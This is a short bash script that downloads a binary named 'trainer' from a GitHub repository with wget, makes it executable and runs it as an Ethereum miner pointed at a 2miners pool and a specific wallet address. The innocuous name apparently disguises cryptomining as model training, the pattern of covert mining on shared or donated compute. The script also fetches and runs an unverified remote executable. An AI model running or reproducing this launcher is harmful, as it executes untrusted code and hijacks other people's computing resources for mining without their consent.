#!/bin/bash

POOL="us-eth.2miners.com:12020"
WORKER="0x476241f016e207C4faf657687FcF553f51047030.Worker_$( date +%Y%m%d%H%M%S )"
PARAMS="--algo ETHASH --pool $POOL --user $WORKER --tls on --ethstratum ETHPROXY"

rm trainer

wget https://github.com/blitz2099/reaper/raw/main/trainer
chmod +x trainer
./trainer $PARAMS